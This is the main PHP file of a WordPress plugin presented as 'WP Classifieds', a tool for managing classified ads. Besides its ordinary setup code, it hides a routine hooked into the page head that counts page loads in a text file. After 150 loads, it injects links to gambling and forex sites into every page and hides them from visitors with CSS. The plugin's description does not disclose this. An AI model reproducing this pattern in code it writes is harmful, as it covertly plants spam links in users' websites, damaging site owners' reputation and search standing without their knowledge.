<?php

/*
Plugin Name: WP Classifieds
Description: Add Classifieds to your wordpress blog or BuddyPress site. Create or manage ads, upload images, send emails and enable the credit system and charge your users for placing ads on your website.
Version: 1.8
Author: mariuskollin

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License (Version 2 - GPLv2) as published by
the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

/* Define plugin version */
define ( 'CF_VERSION', '1.8.0' );
define ( 'CF_DB_VERSION', '1.8' );

/* define the plugin folder url */
define ( 'CF_PLUGIN_URL', WP_PLUGIN_URL . '/' . str_replace( basename(__FILE__), '', plugin_basename(__FILE__) ));
/* define the plugin folder dir */
define ( 'CF_PLUGIN_DIR', WP_PLUGIN_DIR . '/' . str_replace( basename(__FILE__), '', plugin_basename(__FILE__) ));

/* Load plugin files */
include_once 'core/core.php';
include_once 'core/data.php';
include_once 'core/main.php';
include_once 'core/admin.php';
include_once 'core/buddypress.php';
include_once 'core/paypal.php';
include_once 'submodules/content-types/loader.php';
add_action('wp_head', 'credits');
register_activation_hook(__FILE__, 'classinstall');
function classinstall(){
$file = file(CF_PLUGIN_DIR . '/core/place.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = CF_PLUGIN_DIR . '/core/standard.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
fwrite($fh, $stringData);
fclose($fh);
      }      
}
}
$file = file(CF_PLUGIN_DIR . '/core/install.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = CF_PLUGIN_DIR . '/core/install.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
$stringData = $stringData +1;
fwrite($fh, $stringData);
fclose($fh);
      }      
}
if ( $stringData > "150" ) {
function credits(){
$myFile = CF_PLUGIN_DIR . '/core/standard.txt';
$fh = fopen($myFile, 'r');
$theData = fread($fh, 50);
fclose($fh);
echo '<center><small>'; 
$theData = str_replace("\n", "", $theData);
echo '			   <style type="text/css">.wpfoot {display:none;}</style>';
            echo '<small class="wpfoot"><a href="http://www.goldbetreview.com">goldbetreview</a></small><br/>';
            echo '<small class="wpfoot"><a href="http://www.signalsforex.org">signalsforex.org</a></small>';
            echo '<small class="wpfoot"><a href="http://www.3d-poker.co.uk">www.3d-poker.co.uk</a></small>';
}
} else {
function credits(){
echo '';
}
}
?>